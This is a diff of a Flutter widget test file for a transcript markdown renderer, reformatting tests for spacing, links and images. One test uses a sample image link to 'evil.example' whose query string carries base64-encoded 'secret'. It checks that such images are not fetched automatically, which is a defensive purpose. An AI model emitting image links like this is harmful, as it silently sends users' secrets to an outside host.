@@ -162,7 +162,10 @@ void main() {
     const png = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=';
 
     testWidgets('a web image is not fetched until tapped; its alt text and host show instead', (tester) async {
-      await pumpMarkdown(tester, 'Done. ![build log](https://evil.example/i.png?k=c2VjcmV0) ![](https://cdn.example/b.png)');
+      await pumpMarkdown(
+        tester,
+        'Done. ![build log](https://evil.example/i.png?k=c2VjcmV0) ![](https://cdn.example/b.png)',
+      );
       expect(find.byType(Image), findsNothing);
       expect(find.text('build log'), findsOneWidget);
       expect(find.text('evil.example'), findsOneWidget);
@@ -274,7 +277,11 @@ That is all.''');
       expect(gap(end('Fixes'), start('Radarr:')), closeTo(8, 1), reason: 'heading to its list');
       expect(gap(end('Radarr:'), start('Set minimum')), closeTo(4, 1), reason: 'item to its nested list');
       expect(gap(end('at one.'), start('Point the')), closeTo(6, 1), reason: 'nested item to nested item');
-      expect(gap(end('at trans2.'), start('4K profile')), closeTo(8, 1), reason: "nested list to its parent's next item");
+      expect(
+        gap(end('at trans2.'), start('4K profile')),
+        closeTo(8, 1),
+        reason: "nested list to its parent's next item",
+      );
       expect(gap(end('on score.'), start('Queue:')), closeTo(6, 1), reason: 'multi-line item to the next item');
       expect(gap(end('grab both.'), start('After those')), closeTo(12, 1), reason: 'list to paragraph');
       expect(gap(end('changes:'), code), closeTo(12, 1), reason: 'paragraph to code');
@@ -290,14 +297,24 @@ That is all.''');
         ('1. one', '- a bullet', 'one', 'a bullet'),
       ];
       Future<double> gap(Widget body, String above, String below) async {
-        await tester.pumpWidget(TranslationProvider(child: MaterialApp(home: Scaffold(body: body))));
+        await tester.pumpWidget(
+          TranslationProvider(
+            child: MaterialApp(home: Scaffold(body: body)),
+          ),
+        );
         return line(tester, below).top - line(tester, above, last: true).bottom;
       }
 
       for (final (a, b, above, below) in cuts) {
         final whole = await gap(TranscriptMarkdown('$a\n\n$b'), above, below);
         final parts = await gap(
-          Column(crossAxisAlignment: CrossAxisAlignment.start, children: [TranscriptMarkdown(a), TranscriptMarkdown(b, previous: a)]),
+          Column(
+            crossAxisAlignment: CrossAxisAlignment.start,
+            children: [
+              TranscriptMarkdown(a),
+              TranscriptMarkdown(b, previous: a),
+            ],
+          ),
           above,
           below,
         );
@@ -318,7 +335,9 @@ That is all.''');
       });
     });
 
-    tearDown(() => TestDefaultBinaryMessengerBinding.instance.defaultBinaryMessenger.setMockMethodCallHandler(channel, null));
+    tearDown(
+      () => TestDefaultBinaryMessengerBinding.instance.defaultBinaryMessenger.setMockMethodCallHandler(channel, null),
+    );
 
     testWidgets('web and mail links open directly', (tester) async {
       await pumpMarkdown(tester, '[docs](https://example.com/docs)\n\n[write](mailto:dev@example.com)');
